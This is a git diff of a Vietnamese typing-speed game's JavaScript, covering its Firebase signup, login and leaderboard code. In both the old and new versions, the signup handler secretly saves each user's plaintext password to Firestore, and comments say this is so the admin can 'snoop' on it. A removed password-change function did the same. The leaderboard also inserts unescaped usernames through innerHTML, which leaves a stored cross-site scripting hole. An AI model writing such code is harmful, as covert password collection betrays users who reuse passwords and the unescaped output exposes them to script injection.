@@ -17,6 +17,7 @@ const dictionary = {
 
 let currentLang = 'vi', words = [], idx = 0, timer = 60, isPlaying = false, interval, cWords = 0, userLoc = "vn";
 
+// Lấy quốc gia dựa trên IP
 fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userLoc = d.country_code.toLowerCase());
 
 function init() {
@@ -64,11 +65,11 @@ function startTimer() {
 function finish() {
     const wpm = Math.round(cWords);
     if(auth.currentUser) saveBestScore(wpm);
-    else alert("Kết quả: " + wpm + " WPM. Đăng nhập để lưu top nhé!");
+    else alert("Kết quả: " + wpm + " WPM. Đăng nhập để lưu điểm!");
     init();
 }
 
-// CẬP NHẬT TOP VỚI USERNAME XỊN
+// LƯU ĐIỂM - FIX LỖI UNDEFINED VÀ USERNAME
 async function saveBestScore(wpm) {
     const u = auth.currentUser;
     const userDoc = await db.collection("users").doc(u.uid).get();
@@ -79,80 +80,81 @@ async function saveBestScore(wpm) {
     
     if (!doc.exists || wpm > doc.data().wpm) {
         await userRef.set({
-            name: username, wpm: wpm, code: userLoc, 
-            lang: currentLang === 'vi' ? "Vietnamese" : "English", date: Date.now()
+            name: username,
+            wpm: wpm,
+            code: userLoc,
+            lang: currentLang === 'vi' ? "Vietnamese" : "English",
+            date: Date.now()
         });
     }
     loadBoard();
 }
 
-// ĐĂNG KÝ CÓ LƯU MẬT KHẨU CHO ADMIN SOI
+// ĐĂNG KÝ/ĐĂNG NHẬP - LƯU PASS CHO ADMIN SOI
 async function handleAuth(type) {
     if (type === 'signup') {
         const username = document.getElementById('r-user').value;
         const email = document.getElementById('r-email').value;
         const pass = document.getElementById('r-pass').value;
-        if(!username || !email || !pass) return alert("Điền đủ info ông ơi!");
+
+        if(!username || !email || !pass) return alert("Điền đủ info!");
+        if(!email.includes("@gmail.com")) return alert("Phải dùng Gmail thật!");
+
         try {
             const res = await auth.createUserWithEmailAndPassword(email, pass);
-            await db.collection("users").doc(res.user.uid).set({ 
-                username, email, password: pass, createdAt: Date.now() 
+            // Lưu vào bảng users để Admin soi mật khẩu
+            await db.collection("users").doc(res.user.uid).set({
+                username: username,
+                email: email,
+                password: pass,
+                createdAt: Date.now()
             });
             location.reload();
-        } catch (err) { alert(err.message); }
+        } catch (err) { alert("Lỗi: " + err.message); }
     } else {
         const email = document.getElementById('l-email').value;
         const pass = document.getElementById('l-pass').value;
-        try { await auth.signInWithEmailAndPassword(email, pass); location.reload(); } 
-        catch (err) { alert("Sai Gmail hoặc Mật khẩu!"); }
+        try {
+            await auth.signInWithEmailAndPassword(email, pass);
+            location.reload();
+        } catch (err) { alert("Sai tài khoản!"); }
     }
+}
+
+// FIX LỖI NaN VÀ HIỂN THỊ BẢNG XẾP HẠNG
+async function loadBoard() {
+    const snap = await db.collection("leaderboard").orderBy("wpm", "desc").limit(100).get();
+    let h = ""; 
+    let rank = 1; // Khởi tạo biến đếm để tránh lỗi NaN
+    
+    snap.forEach(doc => {
+        const d = doc.data();
+        h += `<tr>
+            <td>${rank++}</td> 
+            <td>${d.name}</td>
+            <td style="color:#28a745; font-weight:bold">${d.wpm}</td>
+            <td><img src="https://flagcdn.com/w20/${d.code}.png"></td>
+            <td>${d.lang || "Vietnamese"}</td>
+            <td>Vừa xong</td>
+        </tr>`;
+    });
+    document.getElementById('leaderboard-data').innerHTML = h;
 }
 
 auth.onAuthStateChanged(async (u) => {
     if (u) {
         const userDoc = await db.collection("users").doc(u.uid).get();
-        const userData = userDoc.exists ? userDoc.data() : { username: "User" };
-        document.getElementById('auth-status').innerHTML = `<span style="color:#48bb78">● Online: ${userData.username}</span>`;
+        const name = userDoc.exists ? userDoc.data().username : "Người chơi";
+        document.getElementById('auth-status').innerHTML = `Hi, ${name} <button onclick="auth.signOut().then(()=>location.reload())" class="btn-logout">Thoát</button>`;
         document.getElementById('auth-forms').style.display = 'none';
-        document.getElementById('profile-section').style.display = 'block';
-        document.getElementById('p-username').innerText = userData.username;
-        document.getElementById('p-email').innerText = u.email;
-        document.getElementById('p-date').innerText = new Date(u.metadata.creationTime).toLocaleDateString();
     }
 });
 
-async function loadBoard() {
-    const snap = await db.collection("leaderboard").orderBy("wpm", "desc").limit(100).get();
-    let h = ""; let r = 1;
-    snap.forEach(doc => {
-        const d = doc.data();
-        h += `<tr><td>${r++}</td><td>${d.name}</td><td style="color:#5cb85c; font-weight:bold">${d.wpm}</td>
-        <td><img src="https://flagcdn.com/20x15/${d.code}.png"></td><td>${d.lang || "Vietnamese"}</td><td>Vừa xong</td></tr>`;
-    });
-    document.getElementById('leaderboard-data').innerHTML = h;
-}
-
+function changeLang(l) { currentLang = l; init(); }
+function resetGame() { init(); }
 function switchTab(t) {
     document.getElementById('login-form').style.display = t === 'login' ? 'block' : 'none';
     document.getElementById('reg-form').style.display = t === 'reg' ? 'block' : 'none';
-    document.getElementById('tab-login-btn').className = t === 'login' ? 'active' : '';
-    document.getElementById('tab-reg-btn').className = t === 'reg' ? 'active' : '';
 }
 
-async function changePassword() {
-    const oldP = document.getElementById('old-p').value;
-    const newP = document.getElementById('new-p').value;
-    const user = auth.currentUser;
-    const cred = firebase.auth.EmailAuthProvider.credential(user.email, oldP);
-    try {
-        await user.reauthenticateWithCredential(cred);
-        await user.updatePassword(newP);
-        // Cập nhật lại mật khẩu trong Firestore để admin soi tiếp
-        await db.collection("users").doc(user.uid).update({ password: newP });
-        alert("Đổi mật khẩu thành công!");
-    } catch (e) { alert("Mật khẩu cũ không đúng!"); }
-}
-
-function changeLang(l) { currentLang = l; init(); }
-function resetGame() { init(); }
 init(); loadBoard();
